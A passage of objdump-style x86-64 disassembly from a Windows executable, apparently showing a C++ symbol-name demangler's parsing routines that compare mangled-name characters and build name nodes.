   140003524:	ba 59 00 00 00       	mov    $0x59,%edx
   140003529:	48 89 f1             	mov    %rsi,%rcx
   14000352c:	48 83 c4 30          	add    $0x30,%rsp
   140003530:	5b                   	pop    %rbx
   140003531:	5e                   	pop    %rsi
   140003532:	5f                   	pop    %rdi
   140003533:	e9 08 e0 ff ff       	jmp    0x140001540
   140003538:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000353f:	00 
   140003540:	31 c0                	xor    %eax,%eax
   140003542:	48 83 c4 30          	add    $0x30,%rsp
   140003546:	5b                   	pop    %rbx
   140003547:	5e                   	pop    %rsi
   140003548:	5f                   	pop    %rdi
   140003549:	c3                   	ret
   14000354a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003550:	56                   	push   %rsi
   140003551:	53                   	push   %rbx
   140003552:	48 83 ec 38          	sub    $0x38,%rsp
   140003556:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000355a:	0f b6 18             	movzbl (%rax),%ebx
   14000355d:	49 89 ca             	mov    %rcx,%r10
   140003560:	84 db                	test   %bl,%bl
   140003562:	0f 84 c8 00 00 00    	je     0x140003630
   140003568:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000356c:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140003570:	44 0f b6 58 01       	movzbl 0x1(%rax),%r11d
   140003575:	0f b6 18             	movzbl (%rax),%ebx
   140003578:	45 84 db             	test   %r11b,%r11b
   14000357b:	74 23                	je     0x1400035a0
   14000357d:	48 8d 50 02          	lea    0x2(%rax),%rdx
   140003581:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140003585:	44 0f b6 58 01       	movzbl 0x1(%rax),%r11d
   14000358a:	80 fb 76             	cmp    $0x76,%bl
   14000358d:	0f 85 0b 01 00 00    	jne    0x14000369e
   140003593:	41 8d 43 d0          	lea    -0x30(%r11),%eax
   140003597:	3c 09                	cmp    $0x9,%al
   140003599:	0f 86 99 00 00 00    	jbe    0x140003638
   14000359f:	90                   	nop
   1400035a0:	41 b8 49 00 00 00    	mov    $0x49,%r8d
   1400035a6:	31 d2                	xor    %edx,%edx
   1400035a8:	48 8d 35 d1 2b 02 00 	lea    0x22bd1(%rip),%rsi        # 0x140026180
   1400035af:	90                   	nop
   1400035b0:	44 89 c1             	mov    %r8d,%ecx
   1400035b3:	29 d1                	sub    %edx,%ecx
   1400035b5:	89 c8                	mov    %ecx,%eax
   1400035b7:	c1 e8 1f             	shr    $0x1f,%eax
   1400035ba:	01 c8                	add    %ecx,%eax
   1400035bc:	d1 f8                	sar    $1,%eax
   1400035be:	01 d0                	add    %edx,%eax
   1400035c0:	48 63 c8             	movslq %eax,%rcx
   1400035c3:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   1400035c7:	4c 8d 0c ce          	lea    (%rsi,%rcx,8),%r9
   1400035cb:	49 8b 09             	mov    (%r9),%rcx
   1400035ce:	38 19                	cmp    %bl,(%rcx)
   1400035d0:	74 16                	je     0x1400035e8
   1400035d2:	7f 54                	jg     0x140003628
   1400035d4:	8d 50 01             	lea    0x1(%rax),%edx
   1400035d7:	44 39 c2             	cmp    %r8d,%edx
   1400035da:	75 d4                	jne    0x1400035b0
   1400035dc:	31 c0                	xor    %eax,%eax
   1400035de:	48 83 c4 38          	add    $0x38,%rsp
   1400035e2:	5b                   	pop    %rbx
   1400035e3:	5e                   	pop    %rsi
   1400035e4:	c3                   	ret
   1400035e5:	0f 1f 00             	nopl   (%rax)
   1400035e8:	44 38 59 01          	cmp    %r11b,0x1(%rcx)
   1400035ec:	75 e4                	jne    0x1400035d2
   1400035ee:	41 8b 52 28          	mov    0x28(%r10),%edx
   1400035f2:	41 3b 52 2c          	cmp    0x2c(%r10),%edx
   1400035f6:	7d e4                	jge    0x1400035dc
   1400035f8:	48 63 c2             	movslq %edx,%rax
   1400035fb:	83 c2 01             	add    $0x1,%edx
   1400035fe:	48 c1 e0 05          	shl    $0x5,%rax
   140003602:	49 03 42 20          	add    0x20(%r10),%rax
   140003606:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   14000360d:	00 
   14000360e:	41 89 52 28          	mov    %edx,0x28(%r10)
   140003612:	c7 00 33 00 00 00    	movl   $0x33,(%rax)
   140003618:	4c 89 48 10          	mov    %r9,0x10(%rax)
   14000361c:	48 83 c4 38          	add    $0x38,%rsp
   140003620:	5b                   	pop    %rbx
   140003621:	5e                   	pop    %rsi
   140003622:	c3                   	ret
   140003623:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003628:	41 89 c0             	mov    %eax,%r8d
   14000362b:	eb aa                	jmp    0x1400035d7
   14000362d:	0f 1f 00             	nopl   (%rax)
   140003630:	45 31 db             	xor    %r11d,%r11d
   140003633:	e9 68 ff ff ff       	jmp    0x1400035a0
   140003638:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000363d:	44 88 5c 24 2f       	mov    %r11b,0x2f(%rsp)
   140003642:	e8 b9 eb ff ff       	call   0x140002200
   140003647:	4c 8b 54 24 50       	mov    0x50(%rsp),%r10
   14000364c:	48 89 c1             	mov    %rax,%rcx
   14000364f:	41 8b 52 28          	mov    0x28(%r10),%edx
   140003653:	41 3b 52 2c          	cmp    0x2c(%r10),%edx
   140003657:	7d 83                	jge    0x1400035dc
   140003659:	48 63 c2             	movslq %edx,%rax
   14000365c:	83 c2 01             	add    $0x1,%edx
   14000365f:	48 c1 e0 05          	shl    $0x5,%rax
   140003663:	49 03 42 20          	add    0x20(%r10),%rax
   140003667:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   14000366e:	00 
   14000366f:	41 89 52 28          	mov    %edx,0x28(%r10)
   140003673:	48 85 c9             	test   %rcx,%rcx
   140003676:	0f 84 60 ff ff ff    	je     0x1400035dc
   14000367c:	0f be 54 24 2f       	movsbl 0x2f(%rsp),%edx
   140003681:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140003688:	00 
   140003689:	c7 00 34 00 00 00    	movl   $0x34,(%rax)
   14000368f:	83 ea 30             	sub    $0x30,%edx
   140003692:	48 89 48 18          	mov    %rcx,0x18(%rax)
   140003696:	89 50 10             	mov    %edx,0x10(%rax)
   140003699:	e9 40 ff ff ff       	jmp    0x1400035de
   14000369e:	80 fb 63             	cmp    $0x63,%bl
   1400036a1:	0f 85 f9 fe ff ff    	jne    0x1400035a0
   1400036a7:	41 80 fb 76          	cmp    $0x76,%r11b
   1400036ab:	0f 85 ef fe ff ff    	jne    0x1400035a0
   1400036b1:	8b 51 4c             	mov    0x4c(%rcx),%edx
   1400036b4:	31 c0                	xor    %eax,%eax
   1400036b6:	8b 59 50             	mov    0x50(%rcx),%ebx
   1400036b9:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   1400036be:	85 d2                	test   %edx,%edx
   1400036c0:	0f 94 c0             	sete   %al
   1400036c3:	89 41 50             	mov    %eax,0x50(%rcx)
   1400036c6:	e8 65 ef ff ff       	call   0x140002630
   1400036cb:	4c 8b 54 24 50       	mov    0x50(%rsp),%r10
   1400036d0:	45 31 c9             	xor    %r9d,%r9d
   1400036d3:	49 89 c0             	mov    %rax,%r8
   1400036d6:	41 8b 4a 50          	mov    0x50(%r10),%ecx
   1400036da:	85 c9                	test   %ecx,%ecx
   1400036dc:	74 1d                	je     0x1400036fb
   1400036de:	4c 89 d1             	mov    %r10,%rcx
   1400036e1:	ba 36 00 00 00       	mov    $0x36,%edx
   1400036e6:	e8 55 de ff ff       	call   0x140001540
   1400036eb:	4c 8b 54 24 50       	mov    0x50(%rsp),%r10
   1400036f0:	41 89 5a 50          	mov    %ebx,0x50(%r10)
   1400036f4:	48 83 c4 38          	add    $0x38,%rsp
   1400036f8:	5b                   	pop    %rbx
   1400036f9:	5e                   	pop    %rsi
   1400036fa:	c3                   	ret
   1400036fb:	4c 89 d1             	mov    %r10,%rcx
   1400036fe:	ba 35 00 00 00       	mov    $0x35,%edx
   140003703:	4c 89 54 24 50       	mov    %r10,0x50(%rsp)
   140003708:	e8 33 de ff ff       	call   0x140001540
   14000370d:	4c 8b 54 24 50       	mov    0x50(%rsp),%r10
   140003712:	eb dc                	jmp    0x1400036f0
   140003714:	90                   	nop
   140003715:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000371c:	00 00 00 00 
   140003720:	41 56                	push   %r14
   140003722:	55                   	push   %rbp
   140003723:	57                   	push   %rdi
   140003724:	56                   	push   %rsi
   140003725:	53                   	push   %rbx
   140003726:	48 83 ec 40          	sub    $0x40,%rsp
   14000372a:	48 89 d5             	mov    %rdx,%rbp
   14000372d:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140003734:	00 
   140003735:	4c 89 84 24 80 00 00 	mov    %r8,0x80(%rsp)
   14000373c:	00 
   14000373d:	48 89 cb             	mov    %rcx,%rbx
   140003740:	e8 4b ee ff ff       	call   0x140002590
   140003745:	89 c7                	mov    %eax,%edi
   140003747:	85 c0                	test   %eax,%eax
   140003749:	0f 84 66 02 00 00    	je     0x1400039b5
   14000374f:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140003753:	0f b6 02             	movzbl (%rdx),%eax
   140003756:	3c 46                	cmp    $0x46,%al
   140003758:	0f 84 92 01 00 00    	je     0x1400038f0
   14000375e:	8d 50 d0             	lea    -0x30(%rax),%edx
   140003761:	31 ff                	xor    %edi,%edi
   140003763:	80 fa 09             	cmp    $0x9,%dl
   140003766:	0f 86 9c 01 00 00    	jbe    0x140003908
   14000376c:	8d 50 9f             	lea    -0x61(%rax),%edx
   14000376f:	80 fa 19             	cmp    $0x19,%dl
   140003772:	0f 87 88 00 00 00    	ja     0x140003800
   140003778:	8b 53 4c             	mov    0x4c(%rbx),%edx
   14000377b:	3c 6f                	cmp    $0x6f,%al
   14000377d:	0f 84 45 02 00 00    	je     0x1400039c8
   140003783:	48 89 d9             	mov    %rbx,%rcx
   140003786:	89 54 24 20          	mov    %edx,0x20(%rsp)
   14000378a:	e8 c1 fd ff ff       	call   0x140003550
   14000378f:	8b 54 24 20          	mov    0x20(%rsp),%edx
   140003793:	48 89 c6             	mov    %rax,%rsi
   140003796:	89 53 4c             	mov    %edx,0x4c(%rbx)
   140003799:	48 85 c0             	test   %rax,%rax
   14000379c:	0f 84 ae 02 00 00    	je     0x140003a50
   1400037a2:	83 38 33             	cmpl   $0x33,(%rax)
   1400037a5:	0f 85 68 01 00 00    	jne    0x140003913
   1400037ab:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400037af:	8b 4b 48             	mov    0x48(%rbx),%ecx
   1400037b2:	8b 50 10             	mov    0x10(%rax),%edx
   1400037b5:	48 8b 00             	mov    (%rax),%rax
   1400037b8:	8d 54 11 07          	lea    0x7(%rcx,%rdx,1),%edx
   1400037bc:	89 53 48             	mov    %edx,0x48(%rbx)
   1400037bf:	80 38 6c             	cmpb   $0x6c,(%rax)
   1400037c2:	0f 85 4b 01 00 00    	jne    0x140003913
   1400037c8:	80 78 01 69          	cmpb   $0x69,0x1(%rax)
   1400037cc:	0f 85 41 01 00 00    	jne    0x140003913
   1400037d2:	80 78 02 00          	cmpb   $0x0,0x2(%rax)
   1400037d6:	0f 85 37 01 00 00    	jne    0x140003913
   1400037dc:	48 89 d9             	mov    %rbx,%rcx
   1400037df:	e8 1c ea ff ff       	call   0x140002200
   1400037e4:	49 89 f0             	mov    %rsi,%r8
   1400037e7:	ba 38 00 00 00       	mov    $0x38,%edx
   1400037ec:	48 89 d9             	mov    %rbx,%rcx
   1400037ef:	49 89 c1             	mov    %rax,%r9
   1400037f2:	e8 49 dd ff ff       	call   0x140001540
   1400037f7:	48 89 c6             	mov    %rax,%rsi
   1400037fa:	e9 14 01 00 00       	jmp    0x140003913
   1400037ff:	90                   	nop
   140003800:	3c 44                	cmp    $0x44,%al
   140003802:	0f 84 e8 01 00 00    	je     0x1400039f0
   140003808:	8d 50 bd             	lea    -0x43(%rax),%edx
   14000380b:	80 fa 01             	cmp    $0x1,%dl
   14000380e:	0f 86 47 05 00 00    	jbe    0x140003d5b
   140003814:	3c 4c                	cmp    $0x4c,%al
   140003816:	0f 84 74 01 00 00    	je     0x140003990
   14000381c:	3c 55                	cmp    $0x55,%al
   14000381e:	0f 85 91 01 00 00    	jne    0x1400039b5
   140003824:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003828:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   14000382c:	80 fa 6c             	cmp    $0x6c,%dl
   14000382f:	0f 84 5b 03 00 00    	je     0x140003b90
   140003835:	80 fa 74             	cmp    $0x74,%dl
   140003838:	0f 85 77 01 00 00    	jne    0x1400039b5
   14000383e:	80 38 55             	cmpb   $0x55,(%rax)
   140003841:	0f 85 09 02 00 00    	jne    0x140003a50
   140003847:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000384b:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   140003852:	00 
   140003853:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003857:	80 78 01 74          	cmpb   $0x74,0x1(%rax)
   14000385b:	0f 85 ef 01 00 00    	jne    0x140003a50
   140003861:	48 8d 50 02          	lea    0x2(%rax),%rdx
   140003865:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003869:	0f b6 40 02          	movzbl 0x2(%rax),%eax
   14000386d:	3c 5f                	cmp    $0x5f,%al
   14000386f:	0f 84 d7 04 00 00    	je     0x140003d4c
   140003875:	3c 6e                	cmp    $0x6e,%al
   140003877:	0f 84 e7 04 00 00    	je     0x140003d64
   14000387d:	48 89 d9             	mov    %rbx,%rcx
   140003880:	e8 1b de ff ff       	call   0x1400016a0
   140003885:	83 c0 01             	add    $0x1,%eax
   140003888:	0f 88 c2 01 00 00    	js     0x140003a50
   14000388e:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140003892:	80 3a 5f             	cmpb   $0x5f,(%rdx)
   140003895:	0f 85 b5 01 00 00    	jne    0x140003a50
   14000389b:	48 83 c2 01          	add    $0x1,%rdx
   14000389f:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400038a3:	8b 53 28             	mov    0x28(%rbx),%edx
   1400038a6:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   1400038a9:	0f 8d a1 01 00 00    	jge    0x140003a50
   1400038af:	48 63 f2             	movslq %edx,%rsi
   1400038b2:	83 c2 01             	add    $0x1,%edx
   1400038b5:	48 c1 e6 05          	shl    $0x5,%rsi
   1400038b9:	48 03 73 20          	add    0x20(%rbx),%rsi
   1400038bd:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   1400038c4:	00 
   1400038c5:	89 53 28             	mov    %edx,0x28(%rbx)
   1400038c8:	89 46 10             	mov    %eax,0x10(%rsi)
   1400038cb:	8b 43 38             	mov    0x38(%rbx),%eax
   1400038ce:	c7 06 4a 00 00 00    	movl   $0x4a,(%rsi)
   1400038d4:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   1400038d7:	0f 8d 73 01 00 00    	jge    0x140003a50
   1400038dd:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   1400038e1:	48 63 c8             	movslq %eax,%rcx
   1400038e4:	83 c0 01             	add    $0x1,%eax
   1400038e7:	48 89 34 ca          	mov    %rsi,(%rdx,%rcx,8)
   1400038eb:	89 43 38             	mov    %eax,0x38(%rbx)
   1400038ee:	eb 23                	jmp    0x140003913
   1400038f0:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400038f4:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400038f8:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400038fc:	8d 50 d0             	lea    -0x30(%rax),%edx
   1400038ff:	80 fa 09             	cmp    $0x9,%dl
   140003902:	0f 87 64 fe ff ff    	ja     0x14000376c
   140003908:	48 89 d9             	mov    %rbx,%rcx
   14000390b:	e8 f0 e8 ff ff       	call   0x140002200
   140003910:	48 89 c6             	mov    %rax,%rsi
   140003913:	4c 8b 8c 24 80 00 00 	mov    0x80(%rsp),%r9
   14000391a:	00 
   14000391b:	4d 85 c9             	test   %r9,%r9
   14000391e:	74 13                	je     0x140003933
   140003920:	49 89 f0             	mov    %rsi,%r8
   140003923:	ba 57 00 00 00       	mov    $0x57,%edx
   140003928:	48 89 d9             	mov    %rbx,%rcx
   14000392b:	e8 10 dc ff ff       	call   0x140001540
   140003930:	48 89 c6             	mov    %rax,%rsi
   140003933:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003937:	80 38 42             	cmpb   $0x42,(%rax)
   14000393a:	0f 84 20 01 00 00    	je     0x140003a60
   140003940:	85 ff                	test   %edi,%edi
   140003942:	75 2c                	jne    0x140003970
   140003944:	48 85 ed             	test   %rbp,%rbp
   140003947:	74 16                	je     0x14000395f
   140003949:	49 89 f1             	mov    %rsi,%r9
   14000394c:	49 89 e8             	mov    %rbp,%r8
   14000394f:	ba 01 00 00 00       	mov    $0x1,%edx
   140003954:	48 89 d9             	mov    %rbx,%rcx
   140003957:	e8 e4 db ff ff       	call   0x140001540
   14000395c:	48 89 c6             	mov    %rax,%rsi
   14000395f:	48 89 f0             	mov    %rsi,%rax
   140003962:	48 83 c4 40          	add    $0x40,%rsp
   140003966:	5b                   	pop    %rbx
   140003967:	5e                   	pop    %rsi
   140003968:	5f                   	pop    %rdi
   140003969:	5d                   	pop    %rbp
   14000396a:	41 5e                	pop    %r14
   14000396c:	c3                   	ret
   14000396d:	0f 1f 00             	nopl   (%rax)
   140003970:	49 89 f0             	mov    %rsi,%r8
   140003973:	45 31 c9             	xor    %r9d,%r9d
   140003976:	ba 51 00 00 00       	mov    $0x51,%edx
   14000397b:	48 89 d9             	mov    %rbx,%rcx
   14000397e:	e8 bd db ff ff       	call   0x140001540
   140003983:	48 89 c6             	mov    %rax,%rsi
   140003986:	eb bc                	jmp    0x140003944
   140003988:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000398f:	00 
   140003990:	48 83 43 18 01       	addq   $0x1,0x18(%rbx)
   140003995:	48 89 d9             	mov    %rbx,%rcx
   140003998:	e8 63 e8 ff ff       	call   0x140002200
   14000399d:	48 89 c6             	mov    %rax,%rsi
   1400039a0:	48 85 c0             	test   %rax,%rax
   1400039a3:	74 10                	je     0x1400039b5
   1400039a5:	48 89 d9             	mov    %rbx,%rcx
   1400039a8:	e8 b3 de ff ff       	call   0x140001860
   1400039ad:	85 c0                	test   %eax,%eax
   1400039af:	0f 85 5e ff ff ff    	jne    0x140003913
   1400039b5:	31 f6                	xor    %esi,%esi
   1400039b7:	48 89 f0             	mov    %rsi,%rax
   1400039ba:	48 83 c4 40          	add    $0x40,%rsp
   1400039be:	5b                   	pop    %rbx
   1400039bf:	5e                   	pop    %rsi
   1400039c0:	5f                   	pop    %rdi
   1400039c1:	5d                   	pop    %rbp
   1400039c2:	41 5e                	pop    %r14
   1400039c4:	c3                   	ret
   1400039c5:	0f 1f 00             	nopl   (%rax)
   1400039c8:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400039cc:	80 78 01 6e          	cmpb   $0x6e,0x1(%rax)
   1400039d0:	0f 85 ad fd ff ff    	jne    0x140003783
   1400039d6:	48 83 c0 02          	add    $0x2,%rax
   1400039da:	c7 43 4c 00 00 00 00 	movl   $0x0,0x4c(%rbx)
   1400039e1:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400039e5:	e9 99 fd ff ff       	jmp    0x140003783
   1400039ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400039f0:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400039f4:	80 78 01 43          	cmpb   $0x43,0x1(%rax)
   1400039f8:	0f 84 a2 02 00 00    	je     0x140003ca0
   1400039fe:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140003a02:	48 85 d2             	test   %rdx,%rdx
   140003a05:	74 11                	je     0x140003a18
   140003a07:	8b 0a                	mov    (%rdx),%ecx
   140003a09:	85 c9                	test   %ecx,%ecx
   140003a0b:	74 05                	je     0x140003a12
   140003a0d:	83 f9 18             	cmp    $0x18,%ecx
   140003a10:	75 06                	jne    0x140003a18
   140003a12:	8b 4a 18             	mov    0x18(%rdx),%ecx
   140003a15:	01 4b 48             	add    %ecx,0x48(%rbx)
   140003a18:	0f b6 08             	movzbl (%rax),%ecx
   140003a1b:	80 f9 43             	cmp    $0x43,%cl
   140003a1e:	0f 84 8c 00 00 00    	je     0x140003ab0
   140003a24:	80 f9 44             	cmp    $0x44,%cl
   140003a27:	75 27                	jne    0x140003a50
   140003a29:	0f b6 70 01          	movzbl 0x1(%rax),%esi
   140003a2d:	8d 4e d0             	lea    -0x30(%rsi),%ecx
   140003a30:	80 f9 05             	cmp    $0x5,%cl
   140003a33:	77 1b                	ja     0x140003a50
   140003a35:	4c 8d 05 ac 1a 02 00 	lea    0x21aac(%rip),%r8        # 0x1400254e8
   140003a3c:	0f b6 c9             	movzbl %cl,%ecx
   140003a3f:	49 63 0c 88          	movslq (%r8,%rcx,4),%rcx
   140003a43:	4c 01 c1             	add    %r8,%rcx
   140003a46:	ff e1                	jmp    *%rcx
   140003a48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003a4f:	00 
   140003a50:	31 f6                	xor    %esi,%esi
   140003a52:	e9 bc fe ff ff       	jmp    0x140003913
   140003a57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003a5e:	00 00 
   140003a60:	4c 8b 73 40          	mov    0x40(%rbx),%r14
   140003a64:	90                   	nop
   140003a65:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003a6c:	00 00 00 00 
   140003a70:	48 83 c0 01          	add    $0x1,%rax
   140003a74:	48 89 d9             	mov    %rbx,%rcx
   140003a77:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003a7b:	e8 80 e7 ff ff       	call   0x140002200
   140003a80:	49 89 f0             	mov    %rsi,%r8
   140003a83:	ba 4e 00 00 00       	mov    $0x4e,%edx
   140003a88:	48 89 d9             	mov    %rbx,%rcx
   140003a8b:	49 89 c1             	mov    %rax,%r9
   140003a8e:	e8 ad da ff ff       	call   0x140001540
   140003a93:	48 89 c6             	mov    %rax,%rsi
   140003a96:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003a9a:	80 38 42             	cmpb   $0x42,(%rax)
   140003a9d:	74 d1                	je     0x140003a70
   140003a9f:	4c 89 73 40          	mov    %r14,0x40(%rbx)
   140003aa3:	e9 98 fe ff ff       	jmp    0x140003940
   140003aa8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003aaf:	00 
   140003ab0:	0f be 48 01          	movsbl 0x1(%rax),%ecx
   140003ab4:	80 f9 49             	cmp    $0x49,%cl
   140003ab7:	0f 84 50 02 00 00    	je     0x140003d0d
   140003abd:	44 8d 41 cf          	lea    -0x31(%rcx),%r8d
   140003ac1:	41 80 f8 04          	cmp    $0x4,%r8b
   140003ac5:	77 89                	ja     0x140003a50
   140003ac7:	48 83 c0 02          	add    $0x2,%rax
   140003acb:	44 8d 41 d0          	lea    -0x30(%rcx),%r8d
   140003acf:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003ad3:	8b 43 28             	mov    0x28(%rbx),%eax
   140003ad6:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003ad9:	0f 8d 71 ff ff ff    	jge    0x140003a50
   140003adf:	48 63 f0             	movslq %eax,%rsi
   140003ae2:	83 c0 01             	add    $0x1,%eax
   140003ae5:	48 c1 e6 05          	shl    $0x5,%rsi
   140003ae9:	48 03 73 20          	add    0x20(%rbx),%rsi
   140003aed:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140003af4:	00 
   140003af5:	89 43 28             	mov    %eax,0x28(%rbx)
   140003af8:	48 85 d2             	test   %rdx,%rdx
   140003afb:	0f 84 4f ff ff ff    	je     0x140003a50
   140003b01:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140003b08:	00 
   140003b09:	c7 06 07 00 00 00    	movl   $0x7,(%rsi)
   140003b0f:	44 89 46 10          	mov    %r8d,0x10(%rsi)
   140003b13:	48 89 56 18          	mov    %rdx,0x18(%rsi)
   140003b17:	e9 f7 fd ff ff       	jmp    0x140003913
   140003b1c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003b21:	48 83 c0 02          	add    $0x2,%rax
   140003b25:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003b29:	8b 43 28             	mov    0x28(%rbx),%eax
   140003b2c:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003b2f:	0f 8d 1b ff ff ff    	jge    0x140003a50
   140003b35:	48 63 f0             	movslq %eax,%rsi
   140003b38:	83 c0 01             	add    $0x1,%eax
   140003b3b:	48 c1 e6 05          	shl    $0x5,%rsi
   140003b3f:	48 03 73 20          	add    0x20(%rbx),%rsi
   140003b43:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140003b4a:	00 
   140003b4b:	89 43 28             	mov    %eax,0x28(%rbx)
   140003b4e:	48 85 d2             	test   %rdx,%rdx
   140003b51:	0f 84 f9 fe ff ff    	je     0x140003a50
   140003b57:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140003b5e:	00 
   140003b5f:	c7 06 08 00 00 00    	movl   $0x8,(%rsi)
   140003b65:	89 4e 10             	mov    %ecx,0x10(%rsi)
   140003b68:	48 89 56 18          	mov    %rdx,0x18(%rsi)
   140003b6c:	e9 a2 fd ff ff       	jmp    0x140003913
   140003b71:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003b76:	eb a9                	jmp    0x140003b21
   140003b78:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003b7d:	eb a2                	jmp    0x140003b21
   140003b7f:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003b84:	eb 9b                	jmp    0x140003b21
   140003b86:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003b8b:	eb 94                	jmp    0x140003b21
   140003b8d:	0f 1f 00             	nopl   (%rax)
   140003b90:	80 38 55             	cmpb   $0x55,(%rax)
   140003b93:	0f 85 b7 fe ff ff    	jne    0x140003a50
   140003b99:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140003b9d:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003ba1:	80 78 01 6c          	cmpb   $0x6c,0x1(%rax)
   140003ba5:	0f 85 a5 fe ff ff    	jne    0x140003a50
   140003bab:	48 83 c0 02          	add    $0x2,%rax
   140003baf:	48 8d 54 24 3c       	lea    0x3c(%rsp),%rdx
   140003bb4:	48 89 d9             	mov    %rbx,%rcx
   140003bb7:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
   140003bbe:	00 
   140003bbf:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003bc3:	e8 18 f9 ff ff       	call   0x1400034e0
   140003bc8:	44 8b 44 24 3c       	mov    0x3c(%rsp),%r8d
   140003bcd:	45 85 c0             	test   %r8d,%r8d
   140003bd0:	0f 85 7a fe ff ff    	jne    0x140003a50
   140003bd6:	48 89 d9             	mov    %rbx,%rcx
   140003bd9:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   140003bde:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003be3:	e8 88 f5 ff ff       	call   0x140003170
   140003be8:	48 85 c0             	test   %rax,%rax
   140003beb:	0f 84 5f fe ff ff    	je     0x140003a50
   140003bf1:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140003bf6:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   140003bfb:	48 85 d2             	test   %rdx,%rdx
   140003bfe:	0f 84 4f 01 00 00    	je     0x140003d53
   140003c04:	48 89 42 18          	mov    %rax,0x18(%rdx)
   140003c08:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140003c0c:	80 39 45             	cmpb   $0x45,(%rcx)
   140003c0f:	0f 85 3b fe ff ff    	jne    0x140003a50
   140003c15:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140003c19:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003c1d:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003c21:	80 f9 5f             	cmp    $0x5f,%cl
   140003c24:	74 34                	je     0x140003c5a
   140003c26:	80 f9 6e             	cmp    $0x6e,%cl
   140003c29:	0f 84 21 fe ff ff    	je     0x140003a50
   140003c2f:	48 89 d9             	mov    %rbx,%rcx
   140003c32:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003c37:	e8 64 da ff ff       	call   0x1400016a0
   140003c3c:	83 c0 01             	add    $0x1,%eax
   140003c3f:	41 89 c0             	mov    %eax,%r8d
   140003c42:	0f 88 08 fe ff ff    	js     0x140003a50
   140003c48:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003c4c:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140003c51:	80 38 5f             	cmpb   $0x5f,(%rax)
   140003c54:	0f 85 f6 fd ff ff    	jne    0x140003a50
   140003c5a:	48 83 c0 01          	add    $0x1,%rax
   140003c5e:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003c62:	8b 43 28             	mov    0x28(%rbx),%eax
   140003c65:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003c68:	0f 8d e2 fd ff ff    	jge    0x140003a50
   140003c6e:	48 63 f0             	movslq %eax,%rsi
   140003c71:	83 c0 01             	add    $0x1,%eax
   140003c74:	48 c1 e6 05          	shl    $0x5,%rsi
   140003c78:	48 03 73 20          	add    0x20(%rbx),%rsi
